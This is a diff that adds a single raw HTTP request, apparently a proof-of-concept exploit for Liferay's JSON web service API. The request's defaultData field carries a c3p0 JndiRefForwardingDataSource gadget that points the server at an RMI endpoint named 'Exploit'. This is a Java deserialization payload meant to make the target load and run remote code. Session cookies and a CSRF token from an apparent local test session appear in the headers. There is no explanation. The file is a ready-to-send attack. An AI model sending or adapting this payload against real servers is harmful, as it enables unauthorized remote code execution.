@@ -1,0 +1,18 @@
+POST /api/jsonws/invoke HTTP/1.1
+Host: localhost:8080
+Content-Length: 251
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://localhost:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:8080/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fupdate-column-4-columnId-name-type-defaultData
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=8673ts47b8ib5cnmncv3ejeapl; JSESSIONID=80F9CD624DDF5BFB94A507B43283F248; COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=zh_CN; LFR_SESSION_STATE_20103=1588575734503
+Connection: close
+
+cmd=%7B%22%2Fexpandocolumn%2Fupdate-column%22%3A%7B%7D%7D&p_auth=U3ecHG2U&formDate=1588575732008&columnId=1&name=flight&type=1&%2BdefaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={"jndiName":"rmi://localhost:1099/Exploit","loginTimeout":20}
